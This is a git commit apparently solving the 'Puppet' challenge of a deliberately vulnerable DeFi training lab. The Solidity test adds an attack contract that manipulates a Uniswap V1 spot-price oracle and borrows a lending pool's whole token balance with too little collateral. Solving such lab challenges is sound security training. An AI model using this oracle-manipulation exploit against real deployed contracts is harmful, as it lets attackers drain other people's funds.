224cd0845187a38e9015778999983b9d08b4e2d1
Tanu Gupta <guptatanukhandelwal.96@gmail.com>
2025-06-24 15:12:44 +0530

    fix: solved puppet

--- test/puppet/Puppet.t.sol
+++ test/puppet/Puppet.t.sol
@@ -7,6 +7,37 @@ import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {PuppetPool} from "../../src/puppet/PuppetPool.sol";
 import {IUniswapV1Exchange} from "../../src/puppet/IUniswapV1Exchange.sol";
 import {IUniswapV1Factory} from "../../src/puppet/IUniswapV1Factory.sol";
+import {ERC2771Forwarder} from "@openzeppelin/contracts/metatx/ERC2771Forwarder.sol";
+
+contract PoolAttack {
+    IUniswapV1Exchange private immutable i_exchange;
+    PuppetPool private immutable i_pool;
+    DamnValuableToken private immutable i_token;
+    address private immutable i_recovery;
+
+    constructor(IUniswapV1Exchange exchange, PuppetPool pool, DamnValuableToken token, address recovery) {
+        i_exchange = exchange;
+        i_pool = pool;
+        i_token = token;
+        i_recovery = recovery;
+    }
+
+    function attack() external payable {
+        uint256 tokenBalance = i_token.balanceOf(address(this));
+
+        //player swapping token for ETH, increase the tokens in the exchange and reduce the quantity of ETH from the exchange to deviate the price.
+        i_token.approve(address(i_exchange), tokenBalance);
+        uint256 ethReceived = i_exchange.getTokenToEthInputPrice(tokenBalance);
+        i_exchange.tokenToEthSwapOutput(ethReceived, tokenBalance, block.timestamp);
+
+        uint256 tokensInPool = i_token.balanceOf(address(i_pool));
+        bytes memory data = abi.encodeCall(i_pool.borrow, (tokensInPool, i_recovery));
+        (bool success,) = address(i_pool).call{value: address(this).balance}(data);
+        (success);
+    }
+
+    receive() external payable {}
+}
 
 contract PuppetChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -91,7 +122,17 @@ contract PuppetChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_puppet() public checkSolvedByPlayer {}
+    function test_puppet() public checkSolvedByPlayer {
+        //ETH to receive if Tokens are sold
+        //Deploy PoolAttack contract
+        PoolAttack poolAttack = new PoolAttack(uniswapV1Exchange, lendingPool, token, recovery);
+        //player will transfer tokens to poolAttack contract
+
+        token.transfer(address(poolAttack), token.balanceOf(player));
+
+        //now attack can begin
+        poolAttack.attack{value: 11 ether}();
+    }
 
     // Utility function to calculate Uniswap prices
     function _calculateTokenToEthInputPrice(uint256 tokensSold, uint256 tokensInReserve, uint256 etherInReserve)
